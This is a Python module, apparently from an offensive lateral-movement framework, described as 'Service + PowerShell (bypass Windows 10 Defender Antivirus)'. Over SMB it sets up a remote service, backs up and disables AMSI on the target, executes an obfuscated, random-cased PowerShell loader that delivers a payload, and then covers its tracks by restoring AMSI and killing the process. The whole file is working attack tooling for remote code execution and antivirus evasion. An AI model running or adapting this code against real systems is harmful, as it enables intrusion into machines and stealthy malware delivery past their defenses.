# -*- coding: UTF-8 -*-

import logging
import os

from framework import utils
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.helpers import ServiceHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "Service + PowerShell (bypass Windows 10 Defender Antivirus)"

    local_loader_path = None
    run_powershell = False

    backup_path = None
    backup_amsi = False
    disable_amsi = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))
        self.local_loader_path = os.path.join(self.opts["data"], "loader", "powershell.ps1")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = ServiceHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        # region Disable AMSI
        self.backup_path = "{}\\{}.{}".format(utils.get_random_location(), utils.get_random_name(),
                                              utils.get_random_extension())
        try:
            command = utils.command_backup_amsi(self.backup_path)
            self.helper.execute_command(command)
            self.backup_amsi = True
            logging.info("Backup AMSI: {}".format(command))
        except Exception as e:
            logging.error("Error in backing up AMSI: {}".format(e))
        try:
            command = utils.command_disable_amsi()
            self.helper.execute_command(command)
            self.disable_amsi = True
            logging.info("Disabled AMSI: {}".format(command))
        except Exception as e:
            logging.error("Error in disabling AMSI: {}".format(e))
        # endregion

        script = utils.obfuscate_powershell_script(self.opts, self.local_loader_path)
        script = script.replace("THIS_IS_PIKACHU", self.pipe_name)
        command = '{0} "{1}"'.format(utils.random_case("start /b powershell -comma"), script)
        logging.info("Executing PowerShell payload")
        self.helper.execute_command(command)
        self.run_powershell = True
        utils.sleep(3)

    def clean_up(self):
        # region Restore AMSI
        if self.disable_amsi:
            try:
                command = utils.command_restore_register(self.backup_path)
                self.helper.execute_command(command)
                logging.info("Restore AMSI: {}".format(command))
            except Exception as e:
                logging.error("Error in restoring AMSI: {}".format(e))
        if self.backup_amsi:
            try:
                command = utils.command_delete_file(self.backup_path)
                self.helper.execute_command(command)
                logging.info("Deleted backup file: {}".format(command))
            except Exception as e:
                logging.error("Error in deleting backup file: {}".format(e))
        # endregion

        if self.run_powershell:
            try:
                command = "wmic process where \"name='powershell.exe' " \
                          "and commandline like '%{}%'\" " \
                          "call terminate".format(self.pipe_name)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)
        self.helper.clean_up()
